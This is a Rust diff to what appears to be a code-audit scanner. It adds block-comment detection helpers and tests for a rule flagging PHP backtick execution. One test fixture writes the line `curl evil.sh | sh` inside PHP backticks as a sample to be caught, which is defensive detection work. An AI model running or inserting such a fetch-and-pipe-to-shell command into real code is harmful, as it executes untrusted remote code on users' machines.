@@ -51,6 +51,23 @@ pub fn heredoc_closes(line: &str, label: &str) -> bool {
     }
 }
 
+/// True if `line` opens a block comment whose body continues onto later lines:
+/// a Blade `{{--` or a C-style `/*`, with no matching close on the same line.
+/// Backticks inside such bodies are prose (markdown inline code in a docblock),
+/// never the PHP execution operator.
+pub fn block_comment_opens(line: &str) -> bool {
+    match (line.rfind("{{--"), line.rfind("/*")) {
+        (Some(b), c) if c.is_none_or(|c| c < b) => !line[b..].contains("--}}"),
+        (_, Some(c)) => !line[c..].contains("*/"),
+        _ => false,
+    }
+}
+
+/// True if `line` closes an open block comment (either flavour).
+pub fn block_comment_closes(line: &str) -> bool {
+    line.contains("--}}") || line.contains("*/")
+}
+
 static RE_PYTHON_IMPORT_OS: Lazy<Regex> =
     Lazy::new(|| Regex::new(r#"__import__\s*\(\s*['"]os['"]\s*\)"#).unwrap());
 
@@ -669,6 +686,76 @@ mod tests {
         assert!(heredoc_closes("EOT,", "EOT"));
         assert!(!heredoc_closes("MDfoo", "MD")); // label must be the whole token
         assert!(!heredoc_closes("some text", "MD"));
+    }
+
+    #[test]
+    fn test_block_comment_body_helpers() {
+        // Blade comment spanning lines: opener, prose body, closer.
+        assert!(block_comment_opens("{{--"));
+        assert!(block_comment_opens("    {{-- OAuth consent screen"));
+        assert!(!block_comment_opens("{{-- one liner --}}")); // closes same line
+        assert!(block_comment_opens("/* docblock"));
+        assert!(!block_comment_opens("/* one liner */"));
+        assert!(!block_comment_opens("$x = `whoami`;"));
+        assert!(block_comment_closes("--}}"));
+        assert!(block_comment_closes(" */"));
+        assert!(!block_comment_closes("still prose"));
+    }
+
+    #[test]
+    fn test_php_backtick_suppressed_in_block_comment() {
+        // Regression: a Blade `{{-- --}}` comment whose prose quotes shell
+        // commands in markdown backticks is not the execution operator.
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("authorize.blade.php");
+        let mut f = std::fs::File::create(&path).unwrap();
+        writeln!(f, "{{{{--").unwrap();
+        writeln!(
+            f,
+            "    Published from laravel/mcp (`vendor:publish --tag=mcp-views`)"
+        )
+        .unwrap();
+        writeln!(f, "    built around `@vite` and a font CDN.").unwrap();
+        writeln!(f, "--}}}}").unwrap();
+        writeln!(f, "<html></html>").unwrap();
+
+        let findings = crate::audit::obfuscation::scan_file(
+            &path,
+            &crate::config::ObfuscationConfig::default(),
+        )
+        .unwrap();
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "obfuscation-php-backtick"),
+            "backticks inside a Blade comment must not report as exec: {:?}",
+            findings
+        );
+    }
+
+    #[test]
+    fn test_php_backtick_still_flagged_after_comment_closes() {
+        // The suppression must not leak past the closing marker.
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("evil.blade.php");
+        let mut f = std::fs::File::create(&path).unwrap();
+        writeln!(f, "{{{{--").unwrap();
+        writeln!(f, "    harmless prose with `backticks`").unwrap();
+        writeln!(f, "--}}}}").unwrap();
+        writeln!(f, "<?php $out = `curl evil.sh | sh`; ?>").unwrap();
+
+        let findings = crate::audit::obfuscation::scan_file(
+            &path,
+            &crate::config::ObfuscationConfig::default(),
+        )
+        .unwrap();
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "obfuscation-php-backtick"),
+            "real backtick exec after the comment closes must still report: {:?}",
+            findings
+        );
     }
 
     #[test]
